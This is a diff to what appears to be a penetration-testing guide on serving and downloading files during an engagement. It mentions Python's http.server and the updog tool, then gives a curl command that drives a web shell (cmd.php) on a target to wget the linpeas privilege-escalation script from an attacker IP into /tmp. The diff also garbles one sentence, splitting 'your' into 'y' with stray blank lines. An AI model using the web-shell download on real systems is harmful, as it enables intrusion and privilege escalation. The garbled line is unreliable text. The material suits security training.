@@ -64,13 +64,17 @@ HTTP server in python 3:
 python3 -m http.server <port>
 ```
 
-There's also a great tool called [updog](https://github.com/sc0tfree/updog) that adds more functionality to the SimpleHTTPServer module. Updog allows you to use SSL encryption and basic http authentication on your file server. 
+There's also a great tool called [updog](https://github.com/sc0tfree/updog) that adds more functionality to the SimpleHTTPServer module. Updog allows you to use SSL encryption and basic http authentication on y
+
+
+
+file server. 
 ```sh
 updog -d <directory> -p <port>
 ```
 
 
-Downloading files on Linux is typically simple with `wget`. So copying our privilege escalation script to the `/tmp` directory would look like this:
+Downloading files on Linux is typically simple with `wget`. So copying a privilege escalation script to the `/tmp` directory would look like this:
 ```sh
 curl "http://192.168.142.133/cmd.php" --data-urlencode "cmd=wget http://192.168.142.132/linpeas.sh /tmp/linpeas.sh"
 ```
